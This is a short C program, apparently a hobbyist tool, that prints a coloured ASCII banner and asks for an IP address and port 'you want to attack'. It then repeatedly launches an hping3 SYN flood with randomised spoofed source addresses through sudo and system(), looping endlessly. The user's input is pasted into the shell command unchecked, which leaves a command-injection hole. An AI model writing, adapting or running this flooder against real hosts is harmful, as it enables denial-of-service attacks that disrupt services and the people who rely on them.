#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main()
{
    printf("\033[1m\033[3m\033[36mIt was written by \033[1m\033[35m\033[4mMr.Carrot\033[0m\033[1m\033[36m.\033[0m\n");
    printf("\033[1m\033[3m\033[36mIt just simplified \033[1m\033[35m\033[4m'fping3'\033[0m\033[1m\033[3m\033[36m process.\033[0m\n");
    printf("\033[1m\033[3m\033[31m\033[4mEnjoy that!\n\033[0m");
    sleep(2);
    printf("\033[33m-----\033[0m\033[1mOOOO0\033[0m\033[33m----------\033[0m\033[1mOOOOO\033[0m\033[33m--------|\n\033[0m");
    printf("\033[33m----\033[0m\033[1mOOOOOOO\033[0m\033[33m--------\033[0m\033[1mOOOOOOO\033[0m\033[33m-------|\n\033[0m");
    printf("\033[33m----\033[0m\033[1mOOOOOOOO\033[0m\033[33m------\033[0m\033[1mOOOOOOOOO\033[0m\033[33m------|\n\033[0m");
    sleep(1);
    printf("\033[33m-----\033[0m\033[1mOOOOOOOOO\033[0m\033[33m-----\033[0m\033[1mOOOOOOOO\033[0m\033[33m------|\n\033[0m");
    printf("\033[33m-------\033[0m\033[1mOOOOOOOOO\033[0m\033[33m-----\033[0m\033[1mOOOOOOO\033[0m\33[33m-----|\n\33[0m");
    printf("\033[33m---------\033[0m\033[1mOOOOOOOOO0\033[0m\033[33m---\033[0m\033[1mOOOOOO\033[0m\033[33m-----|\n\033[0m");
    sleep(1);
    printf("\033[33m------------\033[0m\033[1mOOOOOOOOO0OO0OOO\033[0m\033[33m-----|\n\033[0m");
    printf("\033[33m-----------\033[0m\033[1mOOO\033[31mOOO\033[0m\033[1m\033[0m\033[1mOOO\033[31m0OO\033[0m\033[1m0OOO00\033[0m\033[33m----|\n\033[0m");
    printf("\033[33m-----------\033[0m\033[1mOOO0\033[31mOO\033[0m\033[1m\033[0m\033[1mOOO0\033[31mOO\033[0m\033[1m0OOO00\033[0m\033[33m----|\n\033[0m");
    sleep(1);
    printf("\033[33m-----------\033[0m\033[1mOOO0OO\033[30m\033[1mO0O\033[0m\033[1m0OO0OOO00\033[0m\033[33m----|\n\033[0m");
    printf("\033[33m------------\033[0m\033[1mOOOOO\033[30m\033[1mO\033[0m\033[1m00\033[30m\033[1mO\033[0m\033[1m0OO0O00\033[0m\033[33m-----|\n\033[0m");
    printf("\033[33m--------------\033[0m\033[1mOOOO0O0OO0OO\033[0m\033[33m-------|\n\033[0m");
    sleep(1);
    printf("\033[33m-------------\033[0m\033[1m00OOOO0O0OO0OO\033[0m\033[33m------|\n\033[0m");
    printf("\033[33m------------\033[0m\033[1mOOOO0O00000OO0OO\033[0m\033[33m-----|\n\033[0m");
    printf("\033[33m-----------\033[0m\033[1mOOOO0O0000000OO0OO\033[0m\033[33m----|\n\033[0m");
    sleep(1);
    printf("\033[33m----------\033[0m\033[1mOOOO0O0OO000000000OO\033[0m\033[33m---|\n\033[0m");
    printf("\033[33m----------\033[0m\033[1mOO\033[31mInput by format\033[0m\033[1m000\033[0m\033[33m---|\n\033[0m");
    sleep(1);
    printf("\033[1m\033[35mEnter the ip you want to attack>>\033[0m\033[36m");
    char ip[10240];
    scanf("%s",&ip);
    printf("\033[0m\033[1m\033[35mEnter the port you want to attack>>\033[0m\033[36m");
    char port[10240];
    scanf("%s",&port);
    char fp[10240];
    strcpy(fp,"sudo gnome-terminal -x bash -c \"hping3 -c 10000 --flood -n -q -V -I wlan0 --rand-source -S ");
    strcat(fp,ip);
    strcat(fp," -p ");
    strcat(fp,port);
    strcat(fp,"\"\n");
    int x = 0;
    printf("\033[0m\033[31mIf you want to continue,type\"0\">>");
    scanf("%d",&x);
    while(x == 0)
    {
        system(fp);
    }
    return 0;
}